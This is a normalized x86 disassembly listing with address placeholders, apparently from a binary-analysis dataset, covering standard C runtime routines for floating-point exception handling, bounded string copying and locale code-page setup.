mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_41f69e
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_41f111
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ee35
add esp 0x1c
pop ebp
retn
sub_41f134
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_41f6d8
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_41f6d8
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_41f6d8
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_41f6d8
pop ecx
and esi 0xffffffef
fldz
push edi
mov edi [ ebp + 0xc ]
fcomp [ edi ]
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_41f5d5
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_41f6d8
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_41f316
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_4162ac
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_4162ac
mov [ eax ] 0x22
pop ebp
retn
sub_41f343
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_41f377
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_41f6af
push [ ebp + 0x8 ]
call sub_41f316
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_41f6af
lea eax [ ebp - 0x20 ]
push eax
call sub_41ee32
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_41f316
pop ecx
sub_41f417
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
call sub_4162ac
push 0xffff
push [ ebp + 0x14 ]
mov [ eax ] 0x21
call sub_41f6af
fld [ ebp + 0xc ]
pop ecx
pop ecx
pop ebp
retn
push [ ebp + 0x14 ]
fld [ ebp + 0xc ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_41f377
add esp 0x24
pop ebp
retn
sub_41f46c
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x20 ]
lea eax [ ebx + 0x18 ]
push eax
push [ ebx + 0x8 ]
call sub_41f134
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_41f343
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebp - 0x40 ] 0xfffffffe
lea eax [ ebx + 0x18 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_41f111
add esp 0x18
push eax
call sub_41f316
mov [ esp ] 0xffff
push [ ebx + 0x20 ]
call sub_41f6af
fld [ ebx + 0x18 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x20 ]
fld [ ebx + 0x18 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_41f377
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_414a33
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_41f549
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
mov ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_41f575
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov ecx [ ebp + 0xe ]
mov eax 0x7ff8
and ecx eax
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_41f5d5
mov edi edi
push ebp
mov ebp esp
fldz
fcom [ ebp + 0x8 ]
fnstsw ax
test ah 0x44
jpe r-xdata
mov edx [ ebp + 0xe ]
xor ecx ecx
test edx 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_41f549
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_41f549
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_41f6af
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and eax [ ebp - 0x4 ]
or eax ecx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_41f6d8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_41f730
push 0x8
push r--data
call sub_415ff4
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_416039
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_41f7a2
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_419de3
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_419dec
pop ecx
test eax eax
je r-xdata
push eax
call sub_419dec
pop ecx
test eax eax
je r-xdata
push eax
call sub_419dec
push [ rw-data ]
mov esi eax
call sub_419dec
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_419d71
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_419d71
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_419d71
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_419d71
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_419d71
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_419dec
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_41f90b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_4162ac
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
sub_41f97f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_4162ac
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
sub_41fa34
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_4162ac
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_41fa7f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_415093
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_415093
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_415093
push [ esi + 0xc0 ]
call sub_415093
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_421e23
push [ edi ]
call sub_415093
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_415093
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_415093
pop ecx
push [ esi + 0xb0 ]
call sub_415093
push [ esi + 0xbc ]
call sub_415093
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_415093
push [ esi + 0xbc ]
call sub_421ffd
pop ecx
pop ecx
push eax
call sub_415093
pop ecx
push eax
call sub_415093
push [ esi + 0xbc ]
call sub_421fb8
pop ecx
pop ecx
sub_41fbc8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_41fc57
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_41fcf0
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_41fbc8
pop ecx
test esi esi
je r-xdata
push esi
call sub_41fc57
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_41fa7f
pop ecx
sub_41fd2e
push 0xc
push r--data
call sub_415ff4
call sub_41a075
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_41fcf0
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41fd98
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_41a075
mov esi [ eax + 0x6c ]
mov eax esi
call sub_416039
retn
push 0x20
call sub_418293
pop ecx
sub_41fda4
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_41fdd3
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_415f60
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_41fe37
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_422290
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_4226c5
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_4226c5
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_415f60
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
